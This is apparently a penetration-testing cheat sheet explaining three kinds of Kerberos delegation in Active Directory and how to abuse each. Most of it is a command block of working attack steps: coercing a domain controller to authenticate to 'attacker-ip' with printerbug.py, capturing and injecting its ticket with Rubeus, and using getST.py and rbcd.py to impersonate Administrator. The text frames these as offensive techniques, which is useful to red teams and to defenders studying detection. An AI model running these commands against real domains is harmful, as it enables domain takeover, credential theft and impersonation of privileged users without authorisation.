**Delegation lets a service impersonate a user to reach a second service on their behalf** (e.g. a web server needs to query a database as the logged-in user). Three flavours, worst-to-best for defenders: **Unconstrained** = the box can impersonate _anyone_ who authenticates to it, including a Domain Admin, so you just have to coerce a DA/DC to connect. **Constrained (S4U2Proxy)** = restricted to specific target services, but if you own the delegating account you can impersonate anyone against those services. **RBCD** = the target itself decides who can delegate to it — if you have write access to that setting, you grant yourself delegation rights.

```
# ── Unconstrained: find it, then coerce a DC to auth to it ──
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
# Coerce the DC (PrinterBug/PetitPotam) while monitoring for the TGT:
python3 printerbug.py corp.local/stephanie:'Password123'@DC01 attacker-ip
Rubeus.exe monitor /interval:5 /filteruser:DC01$
# Use the captured TGT:
Rubeus.exe ptt /ticket:<base64_ticket>

# ── Constrained (S4U2Proxy) — you control an account with delegation set ──
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
getST.py -spn cifs/target.corp.local -impersonate Administrator \
    corp.local/svc_account:'Password123' -dc-ip 192.168.x.100

# ── RBCD — you have GenericWrite/GenericAll on the target computer ──
rbcd.py -delegate-to 'TARGET$' -delegate-from 'ATTACKPC$' -dc-ip 192.168.x.100 -action write corp.local/stephanie:'Password123'
getST.py -spn cifs/target.corp.local corp.local/'ATTACKPC$':'Attack123!' -impersonate Administrator -dc-ip 192.168.x.100
```